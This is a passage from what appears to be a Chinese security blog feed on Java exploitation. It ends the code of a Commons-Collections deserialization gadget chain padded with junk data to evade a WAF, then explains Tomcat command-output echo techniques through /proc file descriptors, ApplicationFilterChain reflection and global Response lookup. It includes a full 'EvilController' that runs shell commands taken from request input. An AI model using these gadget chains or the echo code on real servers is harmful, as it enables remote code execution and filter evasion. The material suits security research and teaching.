class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dirtyData</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50000</span>;i++)&#123;</span><br><span class="line">            dirtyData += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        list.add(dirtyData);</span><br><span class="line">        list.add(expMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(list);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>绕WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>Java回显技术</title>
    <url>/2025/04/16/Java%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="BvQtJ">Java回显技术</h1>
<h2 id="DaVh2">通过文件描述符回显</h2>

<p>该回显方法是基于<code>proc/self/fd/i</code>的攻击</p>
<h3 id="TdACQ">分析</h3>

<p>在Linux环境下，可以通过文件描述符<code>proc/self/fd/i</code>获取到网络连接，在Java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络进行读写操作，可以釜底抽薪在根源上解决回显问题。简单来说就是利用linux文件描述符实现漏洞回显</p>
<p>如果我们获取到了当前请求对应进程的文件描述符，如果向输出描述符中写入内容，那么就会在回显中显示，从原理上可行，但是我们该如何获得本次请求描述符</p>
<p>解决这个问题就要思考在一次连接请求过程中有什么特殊的东西可通过代码识别出来，从而筛选出对应的请求信息。那么这个特殊的标识应该就是，客户端的访问ip地址了。</p>
<p>我们可以看到，在<code>proc/net/tcp6</code>中存储了大量连接请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744029848430-c51c4a2d-858b-4d98-87b0-9c0a90006a17.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744029848430-c51c4a2d-858b-4d98-87b0-9c0a90006a17.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p> local_address 是服务端的地址和连接端口，remote_address 是远程机器的地址和端口，因此我们可以通过 remote_address 字段筛选出需要的 inode 号。这里的 inode 号会在 <code>/proc/xx/fd/ </code>中的 socket 一一对应</p>
<p>去到 <code>proc/&#123;进程号&#125;/fd </code>文件夹下，执行 ll 命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744029981077-56d5912f-6662-43b4-8909-8ff6080e403e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744029981077-56d5912f-6662-43b4-8909-8ff6080e403e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>有了这个对应关系，我们就可以在 <code>/proc/xx/fd/</code> 目录中筛选出对应inode号的socket，从而获取了文件描述符。整体思路如下：</p>
<ol>
<li>通过 client ip 在 <code>/proc/net/tcp6（/proc/net/tcp）</code> 文件中筛选出对应的 inode 号</li>
<li>通过 inode 号在 <code>/proc/&#123;进程号&#125;/fd/</code> 中筛选出fd号</li>
<li>创建 FileDescriptor 对象</li>
<li>执行命令并向 FileDescriptor 对象输出命令执行结果</li>
</ol>
<h2 id="rx5Tl">Tomcat半通用回显</h2>
如果在Java代码执行时，能获取到response对象，则可以直接向response对象中写入命令执行的结果，从而实现回显。因此我们目的就是找到一个可以利用的response对象，思路如下

<ul>
<li>通过翻阅函数调用栈寻找存储response的类</li>
<li>最好是一个静态变量，这样就不需要去获取实例</li>
<li>使用ThreadLoaca保存response，获取到当前线程的请求信息</li>
<li>修复原有输出，防止报错</li>
</ul>
<h3 id="Aun9z">分析</h3>
为了通用性，我们最好找到一个tomcat中存储着response的类，顺着堆栈一直往回找

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744003193189-92c51aaf-2dae-461f-aafb-893333ef583f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744003193189-92c51aaf-2dae-461f-aafb-893333ef583f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>从HTTP请求的入口开始往后，request和response几乎就是一路传递，且在内存中均为同一个变量（后面会将初始的req和res封装到了新的req和res中）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744003348343-417d0903-263e-4248-8f20-266f22845ea4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744003348343-417d0903-263e-4248-8f20-266f22845ea4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这样就代表着，我们只需要获取其中一个类中的response实例即可</p>
<p>根据上述思路，我们找到了<code>ApplicationFilterChain</code>对象中 静态的<code>ThreadLocal</code>保存的<code>Response</code>类型的属性lastServicedResponse</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744004133155-fe0edd48-0599-4a3a-8cc1-72e8d42ac3d5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744004133155-fe0edd48-0599-4a3a-8cc1-72e8d42ac3d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里的静态代码块在初始时，已经把lastServiceResponse设置为null（<code>WRAP_SAME_OBJECT</code>默认为false）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744004174110-1405a96b-50f4-41cc-b9a1-bc7eff61e41f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744004174110-1405a96b-50f4-41cc-b9a1-bc7eff61e41f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里的<code>internalDoFilter</code>方法将当前request和response对象赋值给lastServiceRequest和lastServiced对象的操作，但是需要<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值为true，同时需要两个对象为<code>ThreadLocal</code>类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744004482127-17346f2a-ef0d-4c0c-b898-13f6d0709e44.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744004482127-17346f2a-ef0d-4c0c-b898-13f6d0709e44.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>因此这里需要有两个操作</p>
<ul>
<li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>值为true，走到if判断中</li>
<li>初始化lastServicedRequest和lastServicedResponse变量为<code>ThreadLocal</code>类，默认为null</li>
</ul>
<p><strong>getWriter重复使用报错</strong></p>
<p>在使用response的getWriter函数时，usingWriter变量会被设置为true。如果在该请求中usingWriter变成了true，那么后面重复使用getWriter方法时就会报错</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ResponseFacade#getWriter</span></span><br><span class="line"><span class="keyword">public</span> PrintWriter <span class="title function_">getWriter</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="built_in">this</span>.response.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isFinished()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.response.setSuspended(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> writer;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//Response#getWriter</span></span><br><span class="line"><span class="keyword">public</span> PrintWriter <span class="title function_">getWriter</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.usingOutputStream) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(sm.getString(<span class="string">&quot;coyoteResponse.getWriter.ise&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ENFORCE_ENCODING_IN_GET_WRITER) &#123;</span><br><span class="line">                <span class="built_in">this</span>.setCharacterEncoding(<span class="built_in">this</span>.getCharacterEncoding());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.usingWriter = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">this</span>.outputBuffer.checkConverter();</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.writer == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.writer = <span class="keyword">new</span> <span class="title class_">CoyoteWriter</span>(<span class="built_in">this</span>.outputBuffer);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.writer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>报错如下：getWriter已经被调用过一次</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalStateException: getWriter() has already been called <span class="keyword">for</span> <span class="built_in">this</span> response</span><br></pre></td></tr></table></figure>

<p>这里就有两种解决方法：</p>
<ul>
<li>在调用完<code>getWriter</code>后反射修改usingWriter的值为false</li>
<li>使用<code>getOutputStream</code>代替</li>
</ul>
<h3 id="yRaih">实现</h3>

<p>实现如下，需要访问两次，第一次为设置<code>ApplicationDispathcer.WRAP_SAME_OBJECT</code>变量为true以及为lastServicedResponse对象进行初始化为ThreadLocal对象；第二次从lastServicedResponse对象中取出response对象进行操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.echo.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">IndexController</span><span class="params">(String input)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">wrapSameObject</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);<span class="comment">//获取WRAP_SAME_OBJECT字段</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);<span class="comment">//获取控制final的字段</span></span><br><span class="line">            modifiers.setAccessible(<span class="literal">true</span>);<span class="comment">//设置变量为可访问</span></span><br><span class="line">            modifiers.setInt(wrapSameObject, wrapSameObject.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//取消final</span></span><br><span class="line">            wrapSameObject.setAccessible(<span class="literal">true</span>);<span class="comment">//设置变量为可访问</span></span><br><span class="line">            wrapSameObject.set(<span class="literal">null</span>,<span class="literal">true</span>);<span class="comment">//将WRAP_SAME_OBJECT设置为true</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);<span class="comment">//获取lastServicedResponse字段</span></span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//取消final</span></span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);<span class="comment">//设置变量为可访问</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);<span class="comment">//获取lastServicedRequest字段</span></span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//取消final</span></span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);<span class="comment">//设置变量为可访问</span></span><br><span class="line"></span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; servletResponseThreadLocal = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponse.get(<span class="literal">null</span>);<span class="comment">//获取静态变量lastServicedRequest</span></span><br><span class="line">            <span class="keyword">if</span>(servletResponseThreadLocal == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());<span class="comment">//初始化lastServicedResponse</span></span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());<span class="comment">//初始化lastServicedRequest</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(input!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> servletResponseThreadLocal.get();<span class="comment">//获取repsonse</span></span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> servletResponse.getWriter();<span class="comment">//获取writer</span></span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">responseField</span> <span class="operator">=</span> ResponseFacade.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);<span class="comment">//获取response字段</span></span><br><span class="line">                responseField.setAccessible(<span class="literal">true</span>);<span class="comment">//设置变量为可访问</span></span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) responseField.get(servletResponse);<span class="comment">//获取变量</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">usingWriter</span> <span class="operator">=</span> Response.class.getDeclaredField(<span class="string">&quot;usingWriter&quot;</span>);<span class="comment">//获取usingWriter字段</span></span><br><span class="line">                usingWriter.setAccessible(<span class="literal">true</span>);<span class="comment">//设置变量为可访问</span></span><br><span class="line">                usingWriter.set((Object) response, Boolean.FALSE);<span class="comment">//设置usingWriter为false</span></span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmd = isLinux?<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,input&#125;:<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,input&#125;;</span><br><span class="line"></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">stream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<span class="comment">//获取命令执行输入流</span></span><br><span class="line">                <span class="comment">// 方法一：使用 outputStream.write() 方法输出</span></span><br><span class="line">                <span class="comment">// responseFacade.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));</span></span><br><span class="line">                <span class="comment">// responseFacade.flushBuffer();</span></span><br><span class="line">                <span class="comment">//方法二：使用 writer.writeA() 方法输出</span></span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(stream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                writer.write(s);</span><br><span class="line">                writer.flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致流程图如下（个人理解，有问题请大佬指出）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744026235796-317d4d57-9027-4272-85a0-33454a460c88.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744026235796-317d4d57-9027-4272-85a0-33454a460c88.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="Yf41s">局限性</h3>

<p>这个方法有一些局限性，如果漏洞在<code>ApplicationFilterChain</code>进行<code>lastServicedResponse.set(response);</code>之前触发，就不会将我们的执行结果写入lastServicedResponse当中，那么我们在获取lastServicedResponse之中的response时就无法获取Tomcat Response进行回显</p>
<p>Shiro反序列化漏洞就遇到了这种情况，shiro的rememberMe功能是shiro自己实现的一个filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line">        ...</span><br><span class="line">         filter.doFilter(request, response, <span class="built_in">this</span>);<span class="comment">//Shiro漏洞触发点</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (...)</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest.set(request);</span><br><span class="line">        lastServicedResponse.set(response);<span class="comment">//Tomcat回显关键点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (...)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        servlet.service(request, response);<span class="comment">//servlet调用点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，首先获取所有Filter对当前请求进行拦截，通过后，再进行<code>lastServicedResponse.set(response);</code>操作，然后再进行<code>servlet.service(request, response);</code></p>
<p>rememberMe功能是ShiroFilter的一个模块，在这部分逻辑中执行时，就会触发反序列化漏洞，还没进入到<code>lastServicedResponse.set(response);</code>的操作中，此时的<code>lastServicedResponse</code>内容就是空，从而也就获取不到我们想要的response</p>
<h2 id="KuZiL">通过全局存储 Response回显</h2>
上述半通用回显，是通过反射修改值，从而改变了Tomcat的流程，使得最终可以在ApplicationFilterChain类的lastServicedResponseField对象中去取到response对象，但是依赖于Tomcat本身代码的处理流程，注入点在写入response之前就不可以了

<p>而现在这种方法是不再寻求改变代码流程，而是找找有没有Tomcat全局存储的request或response</p>
<h3 id="lGgNI">分析</h3>
<h4 id="VZZkW">寻找全局Response</h4>

<p>我们知道，Tomcat处理HTTP请求的时候流程入口在<code>org.apache.coyote.http11.Http11Processor</code>类中，该类继承了<code>AbstractProcessor</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Http11Processor</span> <span class="keyword">extends</span> <span class="title class_">AbstractProcessor</span></span><br></pre></td></tr></table></figure>

<p>在<code>AbstractProcessor</code>类中，存在着两个属性request和response，且这两个属性都被final所修饰，说明这个值在赋值之后是无法被修改的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744087815162-f3fd730a-facf-4d0f-b720-c2e6a8325a81.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744087815162-f3fd730a-facf-4d0f-b720-c2e6a8325a81.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>AbstractProcessor</code>类的构造函数中，就对request和response赋值了，那么我们只需要获取到<code>Http11Processor</code>类就可以拿到request和response</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744087992813-9ab6e9b7-5606-4308-a4b7-50ca7eade9ea.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744087992813-9ab6e9b7-5606-4308-a4b7-50ca7eade9ea.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>但是这里的request和response并不是静态变量，无法直接从类中提取出来，需要从对象里面获取。这时我们就需要去找存储<code>Http11Processor</code>或<code>Http11Processor.request/response</code>的变量</p>
<p>往回翻找调用方法，找到<code>AbstractProtcol</code>的内部类<code>ConnectionHandler#process</code>中有<code>register(processor);</code>这么一个操作，用<code>register</code>方法对<code>Http11Processor</code>进行操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744088309426-801f6ae4-8bba-448f-b2d3-7acc261f4f95.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744088309426-801f6ae4-8bba-448f-b2d3-7acc261f4f95.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进到<code>register</code>方法中，可以看到rp是从<code>Http11Processor</code>中获取的<code>RequestInfo</code>类，rp中包含着request对象，而request对象中包含response对象，随后就对rp调用了<code>setGlobalProcessor(global)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744088613074-8b0434dc-0a9f-4a2a-bb16-b0a23ef2ee54.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744088613074-8b0434dc-0a9f-4a2a-bb16-b0a23ef2ee54.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>setGlobalProcessor(global)</code>中，可以看到这里把RequestInfo对象注册到了global中，这个global是AbstractProtcol内部类ConnectionHandler的一个属性</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744088916474-e185c4fc-5235-4059-824a-029621cebd8c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744088916474-e185c4fc-5235-4059-824a-029621cebd8c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>那么我们只要获取到global对象就可以获取到里面的response对象了，获取链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractProtocol$ConnectoinHandler --&gt; global --&gt; RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<p>但是该global仍然不是static，因此我们还要找存储<code>AbstractProtocol</code>类或<code>AbstractProtocol</code>子类的参数</p>
<p>在调用栈中存在<code>CoyoteAdapter</code>类，其中connector对象的protocolHandler属性为Http11NioProtocol，http11NioProtocol的handler就是AbstractProtocol$ConnectoinHandler</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744090357904-10a71985-6dfd-4495-8cfa-c56e0bb339d5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744090357904-10a71985-6dfd-4495-8cfa-c56e0bb339d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>获取链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connector --&gt; protocolHandler --&gt; handler --&gt; AbstractProtocol$ConnectoinHandler --&gt; global--&gt;RequestInfo --&gt; req --&gt; response</span><br></pre></td></tr></table></figure>

<p>现在最重要的问题就是，该如何去获取这个connector</p>
<p>在Tomcat的启动过程中会创建<code>connector</code>对象，并且通过<code>addConnector</code>方法放入<code>connectors</code>中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744091041180-beaa01f2-6623-42c0-959d-440069fc02e2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1744091041180-beaa01f2-6623-42c0-959d-440069fc02e2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进到<code>StandardService#addConnector</code>方法中，该方法将传入的connector对象放到了<code>StandardService</code>对象的connectors[]数组中</p>
